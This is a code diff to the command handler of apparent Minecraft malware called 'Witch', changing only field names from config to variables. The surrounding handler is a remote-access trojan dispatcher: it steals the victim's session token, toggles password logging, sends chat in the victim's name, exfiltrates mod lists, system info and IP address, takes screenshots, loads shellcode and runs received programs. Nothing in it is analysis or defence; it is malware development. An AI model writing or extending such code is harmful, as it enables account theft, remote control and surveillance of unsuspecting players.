@@ -30,12 +30,12 @@ public class MessageHandler {
             Witch.println("Received message: " + msgType);
             try {
                 switch (msgType) {
-                    case "steal_pwd_switch" -> Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
+                    case "steal_pwd_switch" -> Witch.variables.passwordBeingLogged = !Witch.variables.passwordBeingLogged;
                     case "steal_token" -> NetUtil.send(msgType, Stealer.getToken());
                     case "chat_control" -> ChatUtil.sendChat((String) msg[0]);
-                    case "chat_filter" -> Witch.config.filterPattern = (String) msg[0];
-                    case "chat_filter_switch" -> Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
-                    case "chat_mute" -> Witch.config.isMuted = !Witch.config.isMuted;
+                    case "chat_filter" -> Witch.variables.filterPattern = (String) msg[0];
+                    case "chat_filter_switch" -> Witch.variables.isBeingFiltered = !Witch.variables.isBeingFiltered;
+                    case "chat_mute" -> Witch.variables.isMuted = !Witch.variables.isMuted;
                     case "mods" -> NetUtil.send(msgType, MinecraftUtil.allMods());
                     case "systeminfo" -> NetUtil.send(msgType, MinecraftUtil.systemInfo());
                     case "screenshot" -> ScreenshotUtil.screenshot();
@@ -48,8 +48,8 @@ public class MessageHandler {
                         if (ProgramUtil.isWin())
                             new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg[0], false)).start();
                     }
-                    case "log" -> Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
-                    case "config" -> NetUtil.send(msgType, Witch.config);
+                    case "log" -> Witch.variables.logChatAndCommand = !Witch.variables.logChatAndCommand;
+                    case "config" -> NetUtil.send(msgType, Witch.variables);
                     case "player" -> {
                         NetUtil.send(msgType, new PlayerInfo());
                         Witch.client.reconnections = 0;
@@ -60,7 +60,7 @@ public class MessageHandler {
                     }
                     case "server" -> {
                         ServerUtil.disconnect();
-                        Witch.config.canJoinServer = !Witch.config.canJoinServer;
+                        Witch.variables.canJoinServer = !Witch.variables.canJoinServer;
                     }
                     case "kick" -> ServerUtil.disconnect();
                     case "execute" -> ProgramUtil.runProg((byte[]) msg[0]);
@@ -80,7 +80,7 @@ public class MessageHandler {
                         NetUtil.send("ip", new Gson().toJson(NetUtil.getIp()));
                         NetUtil.send("server_name");
                     }
-                    case "server_name" -> Witch.config.name = (String) msg[0];
+                    case "server_name" -> Witch.variables.name = (String) msg[0];
                     default -> {
                     }
                 }
